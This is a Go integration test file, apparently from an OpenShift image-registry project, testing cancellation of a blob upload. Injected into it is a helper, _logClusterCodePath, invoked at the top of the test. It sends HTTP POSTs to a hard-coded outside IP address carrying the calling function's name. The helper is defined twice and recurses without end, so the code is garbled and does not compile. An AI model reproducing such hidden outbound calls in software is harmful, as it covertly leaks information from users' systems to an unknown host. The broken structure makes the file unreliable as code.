package integration

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"testing"
	"github.com/openshift/image-registry/pkg/testframework"
)

func TestUploadBlobCancel(t *testing.T) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	master := testframework.NewMaster(t)
	defer master.Close()
	registry := master.StartRegistry(t)
	defer registry.Close()
	ctx := context.Background()
	testuser := master.CreateUser("testuser", "testp@ssw0rd")
	testproject := master.CreateProject("image-registry-test-upload-blob-cancel", testuser.Name)
	imageStreamName := "test-upload-blob-cancel"
	repo := registry.Repository(testproject.Name, imageStreamName, testuser)
	w, err := repo.Blobs(ctx).Create(ctx)
	if err != nil {
		t.Fatalf("unable to initiate upload: %s", err)
	}
	if err := w.Cancel(ctx); err != nil {
		t.Fatalf("unable to cancel upload: %s", err)
	}
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
